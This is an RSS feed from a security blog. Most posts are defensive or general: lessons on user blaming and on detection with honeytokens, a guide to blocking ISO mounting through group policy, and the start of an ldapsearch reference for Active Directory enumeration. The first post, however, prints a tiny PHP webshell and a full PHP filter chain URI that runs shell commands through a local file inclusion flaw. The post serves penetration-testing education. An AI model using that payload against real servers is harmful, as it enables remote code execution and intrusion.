<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on malicious.link</title>
    <link>https://malicious.link/post/</link>
    <description>Recent content in Posts on malicious.link</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 16 Apr 2023 04:00:00 -0500</lastBuildDate>
    
        <atom:link href="https://malicious.link/post/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Simple PHP webshell with php filter chains</title>
      <link>https://malicious.link/post/2023/simple-php-webshell-with-php-filter-chains/</link>
      <pubDate>Sun, 16 Apr 2023 04:00:00 -0500</pubDate>
      
      <guid>https://malicious.link/post/2023/simple-php-webshell-with-php-filter-chains/</guid>
      <description>&lt;p&gt;Recently found an LFI in a PHP application and one of the cool things I learned about recently was &lt;a href=&#34;https://github.com/synacktiv/php_filter_chain_generator&#34;&gt;PHP filter chains&lt;/a&gt;. More info here: &lt;a href=&#34;https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html&#34;&gt;https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;However, if you are using this in a URL, it&amp;rsquo;s pretty hard to do anything too complicated since it expands the text to the point where web servers won&amp;rsquo;t accept the URL anymore (8190 characters is default max in Apache).&lt;/p&gt;
&lt;p&gt;So I used this:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?=`$_GET[0]`?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From: &lt;a href=&#34;https://github.com/bayufedra/Tiny-PHP-Webshell&#34;&gt;https://github.com/bayufedra/Tiny-PHP-Webshell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Which resulted in the following 3036 character URI ending in a &lt;code&gt;&amp;amp;0=ls&lt;/code&gt; which executed the command &lt;code&gt;ls&lt;/code&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;amp;0=ls
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This results in a in-memory (not sure if it writes to a temp file with php://temp) php webshell.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Beautiful Basics: Lesson 4</title>
      <link>https://malicious.link/post/2022/beautiful-basics-lesson-04/</link>
      <pubDate>Wed, 22 Jun 2022 04:00:00 -0500</pubDate>
      
      <guid>https://malicious.link/post/2022/beautiful-basics-lesson-04/</guid>
      <description>
&lt;h3 id=&#34;lessons-learned&#34;&gt;Lessons Learned&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-01&#34;&gt;Lesson 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-02&#34;&gt;Lesson 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-03&#34;&gt;Lesson 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-04&#34;&gt;Lesson 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-05&#34;&gt;Lesson 5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-06&#34;&gt;Lesson 6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-07&#34;&gt;Lesson 7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-08&#34;&gt;Lesson 8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-09&#34;&gt;Lesson 9&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-10&#34;&gt;Lesson 10&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-11&#34;&gt;Lesson 11&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&#34;lesson-4---user-blaming&#34;&gt;Lesson 4 - User Blaming&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Security &lt;strong&gt;is NOT&lt;/strong&gt; everyone&amp;rsquo;s job in the company. Stop trying to force the issue. It&amp;rsquo;s security&amp;rsquo;s job to enable, incentivize and protect.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2022/beautifulbasics_lesson4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;In the Marine Corps, I was taught that every Marine is a &amp;ldquo;Rifleman&amp;rdquo;, meaning that any Marine, no matter their MOS (Military Occupational Specialty) - aka their job, could be called upon to engage with the enemy using a rifle or other weapon. This meant that every Marine must be trained, and regularly re-trained/tested, to ensure their proficiency with a rifle. Other branches have similar stances or sayings.&lt;/p&gt;
&lt;p&gt;I believe the mindset that every person in a company has a stake in it&amp;rsquo;s cyber security came from veterans. That or it came from the realm of safety, which I 100% support. Safety is everyone&amp;rsquo;s responsibility. Now is where some of you are equating cyber security with safety, and yes, they do sometimes overlap.&lt;/p&gt;
&lt;p&gt;However, in most cases, cyber security has nothing to do with the safety of a corporations personnel, customers, or it&amp;rsquo;s community.&lt;/p&gt;
&lt;p&gt;So what am I saying? 3 things:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Stop blaming users for clicking on links, or opening macro enabled documents, or inserting USB sticks with viruses on them. We need to get to a place in security where it doesn&amp;rsquo;t matter if they do those things. We need to do better and stop making excuses.&lt;/li&gt;
&lt;li&gt;Security awareness training is usually overly complicated, outdated, or has very little other use. I think those teams are better served by running a security incentivize program. What does this look like? Basically a gamification of security asks.
&lt;ul&gt;
&lt;li&gt;Start a points program at your company.&lt;/li&gt;
&lt;li&gt;Give points away for reporting phishing emails or security infractions like tailgaiting&lt;/li&gt;
&lt;li&gt;Give points monthly for use of a password manager&lt;/li&gt;
&lt;li&gt;Take away points based on security infractions (infected laptop, clicking a phishing email)&lt;/li&gt;
&lt;li&gt;Give points monthly of good password use.&lt;/li&gt;
&lt;li&gt;Give points for early adoption / beta testing of security programs&lt;/li&gt;
&lt;li&gt;Allow points to be spent on gift cards, dinners with the CISO / CEO / CTO, or live events like tickets to concerts or plays.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Change how the security organization talks within and outside the organization about partners in IT, developers and users in general. Managers need to crack down on this type of negative talk because it can be easily felt on calls with those groups.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Number 3 is super important. If you allow people to talk negatively about another group in your company it will quickly become the law of the land, and will decrease motivation to find equitable solutions or even have equitable conversations.&lt;/p&gt;
&lt;p&gt;At the end of the day, we, the security community and vendors have to do a better job at solving problems and rejecting solutions that just perpetuate the status quo.&lt;/p&gt;

&lt;h4 id=&#34;slides&#34;&gt;Slides&lt;/h4&gt;
&lt;iframe src=&#34;https://docs.google.com/presentation/d/e/2PACX-1vQWsIcPGnJ60ROVu3K32uI7Gtg7zciUle7hfZnN5HPrJ1mD38LZWT5x5DQOyd5CpLXt0hL125fKqOQL/embed?start=false&amp;loop=true&amp;delayms=15000&#34; frameborder=&#34;0&#34; width=&#34;960&#34; height=&#34;569&#34; allowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; webkitallowfullscreen=&#34;true&#34;&gt;&lt;/iframe&gt;
&lt;h4 id=&#34;video&#34;&gt;Video&lt;/h4&gt;

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/9yv6SdDtU-Q&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;



</description>
    </item>
    
    <item>
      <title>Beautiful Basics: Lesson 3</title>
      <link>https://malicious.link/post/2022/beautiful-basics-lesson-03/</link>
      <pubDate>Sat, 28 May 2022 03:00:00 -0500</pubDate>
      
      <guid>https://malicious.link/post/2022/beautiful-basics-lesson-03/</guid>
      <description>
&lt;h3 id=&#34;lessons-learned&#34;&gt;Lessons Learned&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-01&#34;&gt;Lesson 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-02&#34;&gt;Lesson 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-03&#34;&gt;Lesson 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-04&#34;&gt;Lesson 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-05&#34;&gt;Lesson 5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-06&#34;&gt;Lesson 6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-07&#34;&gt;Lesson 7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-08&#34;&gt;Lesson 8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-09&#34;&gt;Lesson 9&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-10&#34;&gt;Lesson 10&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-11&#34;&gt;Lesson 11&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;h2 id=&#34;lesson-3---detection-reality&#34;&gt;Lesson 3 - Detection Reality&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;People and Honey tokens are THE BEST detective tool you have.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Go buy a &lt;a href=&#34;https://thinkst.com/&#34;&gt;Thinkst Canary&lt;/a&gt;, they detect me more than any multi-million dollar EDR. Period.&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2022/beautifulbasics_lesson3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Let me clarify something quickly before I get roasted. I am not saying that EDR (Endpoint Detection and Response) agents don&amp;rsquo;t have a place, it&amp;rsquo;s just that they have taken over for Anti-Virus for being mostly preventative and response oriented. Do EDRs detect things? Sure, but in my pentesting and red teaming experience they rarely catch any of the actions I do outside of touching LSASS. Which to be fair, is what a lot of malware and APT actors do. But it won&amp;rsquo;t stay that way, and Sysmon is free :P&lt;/p&gt;
&lt;p&gt;One more clarifying statement. I have no affiliation to &lt;a href=&#34;https://twitter.com/ThinkstCanary&#34;&gt;Thinkst&lt;/a&gt; other than knowing &lt;a href=&#34;https://twitter.com/haroonmeer&#34;&gt;Haroon Meer&lt;/a&gt; through Twitter and meeting him once or twice in person, super amazing dude, I think the world of him. I truly think the Canary as a concept is one of the best detective tools we have. If you don&amp;rsquo;t have fake accounts, computers, and configurations that look vulnerable mixed in with your population of systems you are missing out.&lt;/p&gt;
&lt;p&gt;Finally lets get to the meat of this lesson. Back in 2018 I made this statement:&lt;/p&gt;
&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Dear %Companies%, A single security minded Sys Admin is worth more than a handful of pentesters. Please start investing in the admins you already have. I say this as a pentester who has seen the impact that an empowered admin can have.&lt;/p&gt;&amp;mdash; Rob Fuller (@mubix) &lt;a href=&#34;https://twitter.com/mubix/status/1007296914742759424?ref_src=twsrc%5Etfw&#34;&gt;June 14, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;

&lt;p&gt;System administrators usually know their systems very well. With the move to DevOps, I&amp;rsquo;m not sure if that is decreasing because systems are more transitory or the monitoring systems have kept pace or improved because of it. But, as a pentester / red teamer I have been caught more times by system administrators than any tool security operations has put in place. I did a talk back in 2014 called &lt;a href=&#34;https://www.youtube.com/watch?v=VqcDjPUXPIw&#34;&gt;&amp;ldquo;Attacker Ghost Stories&amp;rdquo;&lt;/a&gt; [&lt;a href=&#34;https://www.slideshare.net/hashdays/attacker-ghost-stories-v8&#34;&gt;slides&lt;/a&gt;] about exactly this and all of the ways system administrators put tricks and traps in place to catch attackers like me.&lt;/p&gt;
&lt;p&gt;What are these tricks? Just to name a few:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Trap&lt;/strong&gt;: Create a domain administrator that has logon hours all turned off with alerting on any attempt to logon with that user not just sent to an alert or a log server but to PagerDuty. This user had the current, real password in the description. No one should EVER use this account.
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Benefit&lt;/strong&gt;: It&amp;rsquo;s too hard to pass up and logon hours aren&amp;rsquo;t commonly looked at by attackers in the attributes for a user, so not only will the attack fail, you&amp;rsquo;ll have a near instant, high fidelity alert of malicious actions on your network.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Alternatives&lt;/strong&gt;: Have an account that is Kerberoastable with a very weak password that doesn&amp;rsquo;t have permission to logon anywhere (you can do this by assigning the user to a computer account that no longer exists). Less risk an attacker will find a way to use the account and still a high fidelity alert (just not as juicy of bait)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Trap&lt;/strong&gt;: A fake login portal that looks like it is a corporate VPN or OWA server, this is a very easy way to identify credentials that had already been stolen some other way from your organization.
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Benefit&lt;/strong&gt;: An attacker will attempt to validate credentials they have stolen other ways.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is just two ideas. Go look at the slides for more, or check out OpenCanary - &lt;a href=&#34;https://github.com/thinkst/opencanary&#34;&gt;https://github.com/thinkst/opencanary&lt;/a&gt; - it&amp;rsquo;s an open source version that you can start to play with along with Canary Tokens if you want even less setup - &lt;a href=&#34;https://canarytokens.org/generate&#34;&gt;https://canarytokens.org/generate&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You don&amp;rsquo;t have to use any of the Thinkst tools, for that matter you don&amp;rsquo;t need any of the new &amp;ldquo;Deception&amp;rdquo; vendors (** **barf** **) out there. Just sprinkle your network with bait of all kinds (ask your pentester, or look at what your last pentest report &amp;ldquo;found&amp;rdquo; as their steps) and make fake things. It&amp;rsquo;s set-it-and-forget-it. Way easier than implementing 500 security vendors to catch bad in every way possible.&lt;/p&gt;

&lt;h4 id=&#34;slides&#34;&gt;Slides&lt;/h4&gt;
&lt;iframe src=&#34;https://docs.google.com/presentation/d/e/2PACX-1vQWsIcPGnJ60ROVu3K32uI7Gtg7zciUle7hfZnN5HPrJ1mD38LZWT5x5DQOyd5CpLXt0hL125fKqOQL/embed?start=false&amp;loop=true&amp;delayms=15000&#34; frameborder=&#34;0&#34; width=&#34;960&#34; height=&#34;569&#34; allowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; webkitallowfullscreen=&#34;true&#34;&gt;&lt;/iframe&gt;
&lt;h4 id=&#34;video&#34;&gt;Video&lt;/h4&gt;

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/9yv6SdDtU-Q&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;



</description>
    </item>
    
    <item>
      <title>Blocking ISO mounting</title>
      <link>https://malicious.link/post/2022/blocking-iso-mounting/</link>
      <pubDate>Fri, 27 May 2022 03:00:00 -0500</pubDate>
      
      <guid>https://malicious.link/post/2022/blocking-iso-mounting/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Update: 10/15/2022&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;One of the hard parts of implementing a block like this is the concern that it will &amp;ldquo;break something&amp;rdquo;. &lt;a href=&#34;https://thedfirreport.com/2022/09/26/bumblebee-round-two/&#34;&gt;The DFIR Report&amp;rsquo;s post on Bumblebee Round 2&lt;/a&gt; has a great suggestion on how to detect legitimate (and illegitimate) use of ISO mounting using Event ID 12 of the Microsoft-Windows-VHDMP-Operational logs. It&amp;rsquo;s not one of the main Application/System/Security logs so you may have to configure your forwarders to start capturing it, but it will give you a good idea of how common it is for your organization to mount ISOs. The following image is an example that I stole from the DFIR Report&amp;rsquo;s blog post.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2022/14373-001.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update: 9/6/2022&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;First, I corrected the misspelling of &lt;code&gt;ProgrammaticAccessOnly&lt;/code&gt; - thanks &lt;a href=&#34;https://twitter.com/0x6A6F7368&#34;&gt;Josh&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;Second, I added &lt;code&gt;SCSI\CdRomMsft____Virtual_DVD-ROM_&lt;/code&gt; into the blog post to make it easier to copy/paste&lt;/p&gt;
&lt;p&gt;Finally, if you are following the below process of blocking ISOs using the &lt;code&gt;SCSI\CdRomMsft____Virtual_DVD-ROM_&lt;/code&gt; method, before you block you may want to double check how wide spread use of virtual ISO mounting is. You can do so via &lt;a href=&#34;https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=6422&#34;&gt;Event ID 6422&lt;/a&gt;. You can see if you have it enabled on a specific host using the following command:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2022/isoblocking_detect.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Using this GPO setting:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2022/isoblocking_detectgpo.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Recently I&amp;rsquo;ve been hearing about malware mounting ISOs as a method of bypassing AV and EDR. For example this article from &lt;a href=&#34;https://www.bleepingcomputer.com/news/security/uptick-seen-in-iso-email-attachments-delivering-malware/&#34;&gt;Bleeping Computer - &amp;ldquo;Uptick Seen in ISO Email Attachments Delivering Malware&amp;rdquo;&lt;/a&gt; posted December 23rd, 2019, or &lt;a href=&#34;https://www.darkreading.com/application-security/chromeloader-malware-hijacks-browsers-iso-files&#34;&gt;DARK Reading - &amp;ldquo;ChromeLoader Malware Hijacks Browsers with ISO Files&amp;rdquo;&lt;/a&gt; posted May 27th, 2022.&lt;/p&gt;
&lt;p&gt;The problem I found with these articles and many like it didn&amp;rsquo;t really offer any sort of method to protect yourself or you company from ISO mounted malware, so I went to try to find a solution myself (couldn&amp;rsquo;t be that hard right?). Turns out that if you google for &amp;ldquo;Stop Windows from Mounting ISOs&amp;rdquo; or something similar you get a bunch of MSDN articles for people trying to solve the same issue for one reason or another.&lt;/p&gt;
&lt;p&gt;After a lot of googling I found this article on &lt;a href=&#34;https://winaero.com/remove-mount-context-menu-windows-10/&#34;&gt;Winaero - &amp;ldquo;Remove Mount Context Menu in Windows 10&amp;rdquo;&lt;/a&gt; posted April 5th 2018. This article shows how to add a simple registry key under &lt;code&gt;HKEY_CLASSES_ROOT\Windows.IsoFile\shell\mount&lt;/code&gt; called &lt;code&gt;ProgrammaticAccessOnly&lt;/code&gt; which would remove the context menu item when you right clicked an ISO. It also removed the functionality of double clicking to auto-mount ISOs. Here is the tweet from May 4th, 2022 when I figured this out:&lt;/p&gt;
&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;For those that are dealing with ISO based malware downloads, might I suggest the following solution: &lt;a href=&#34;https://t.co/2SHxqQFCTG&#34;&gt;https://t.co/2SHxqQFCTG&lt;/a&gt;&lt;br&gt;&lt;br&gt;Basically add &amp;quot;ProgrammaticAccessOnly&amp;quot; to HKEY_CLASSES_ROOT\Windows.IsoFile\shell\mount as a REG_SZ&lt;br&gt;&lt;br&gt;This can be done at a GPO level :)&lt;/p&gt;&amp;mdash; Rob Fuller (@mubix) &lt;a href=&#34;https://twitter.com/mubix/status/1521898616914423809?ref_src=twsrc%5Etfw&#34;&gt;May 4, 2022&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;

&lt;p&gt;This was great because you could put this into a Group Policy and make it so everyone was protected but administrators could still mount drives with PowerShell and the &lt;code&gt;Mount-DiskImage&lt;/code&gt; command.&lt;/p&gt;
&lt;p&gt;I haven&amp;rsquo;t seen malware that downloads ISOs and executes whats in them programmatically after mounting them, but I have heard that this type of malware does exist, and the above protection won&amp;rsquo;t stop that type of malware use case. So I went digging again for a more holistic approach.&lt;/p&gt;
&lt;p&gt;After a lot of googling again, I found this post from &lt;a href=&#34;https://www.neighborgeek.net/2017/10/error-mounting-iso-file-sorry-there-was.html&#34;&gt;NeighborGeek - &amp;ldquo;Error mounting ISO file - &amp;lsquo;Sorry, there was a problem mounting the file&amp;rsquo;&amp;rdquo;&lt;/a&gt; posted October 31st, 2017. In this post it described &amp;ldquo;Device Installation Restrictions&amp;rdquo; in Group Policy that were blocking ISOs from being mounted. I didn&amp;rsquo;t know how to make those settings but I found a great article on &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/client-management/manage-device-installation-with-group-policy&#34;&gt;MSDN - &amp;ldquo;Manage Device installation with Group Policy&amp;rdquo;&lt;/a&gt; that showed me how.&lt;/p&gt;
&lt;p&gt;After playing around with it a bit I was able to block ISOs from being mounted by double click, by context menu, and programmatically through powershell with one simple GPO:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2022/isoblocking_gpo.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;For ease of copy paste: &lt;code&gt;SCSI\CdRomMsft____Virtual_DVD-ROM_&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;KEY TAKEAWAY&lt;/strong&gt;: I would highly recommend this GPO on all of your workstations / laptops. Obviously servers need ISOs a lot more (not sure it&amp;rsquo;s all that common to mount an ISO directly in the OS directly anymore instead of through virtualization software, but I definitely haven&amp;rsquo;t been a sysadmin in a while).&lt;/p&gt;
&lt;p&gt;Here is the tweet from May 21st, 2022 once I figured it out:
&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;After some conversations about this fix, I wanted to look for something more wholistic. Something that would stop both double click, right click mount, and scripted mounting from powershell, etc. So I found this:&lt;a href=&#34;https://t.co/5ABmw1acIK&#34;&gt;https://t.co/5ABmw1acIK&lt;/a&gt;&lt;br&gt;which led me here:&lt;a href=&#34;https://t.co/2at7IhOhTt&#34;&gt;https://t.co/2at7IhOhTt&lt;/a&gt; &lt;a href=&#34;https://t.co/xP5IZhwcNK&#34;&gt;https://t.co/xP5IZhwcNK&lt;/a&gt;&lt;/p&gt;&amp;mdash; Rob Fuller (@mubix) &lt;a href=&#34;https://twitter.com/mubix/status/1528043344051548160?ref_src=twsrc%5Etfw&#34;&gt;May 21, 2022&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>LDAPSearch Reference</title>
      <link>https://malicious.link/post/2022/ldapsearch-reference/</link>
      <pubDate>Sat, 14 May 2022 11:00:00 -0500</pubDate>
      
      <guid>https://malicious.link/post/2022/ldapsearch-reference/</guid>
      <description>&lt;p&gt;&lt;code&gt;ldapsearch&lt;/code&gt; is a extremely powerful tool, especially for Windows Active Directory enumeration. It&amp;rsquo;s one of my primary tools when performing pentesting or red teaming against an environment with Active Directory, but also comes in quiet handy to know as many times it can come default installed or part of a base image, so its a bit Living-Off-The-Land-esq. Another point towards ldapsearch is that it&amp;rsquo;s easy to forget that Active Directory isn&amp;rsquo;t the only LDAP server in most environments and the ability to utilize a tool like this can come in extremely handy.&lt;/p&gt;
&lt;p&gt;If you want to find Active Directory LDAP servers, use the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ dig -t SRV _ldap._tcp.dc._msdcs.sittingduck.info
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;basic-usage&#34;&gt;Basic Usage&lt;/h3&gt;
&lt;ul&gt;
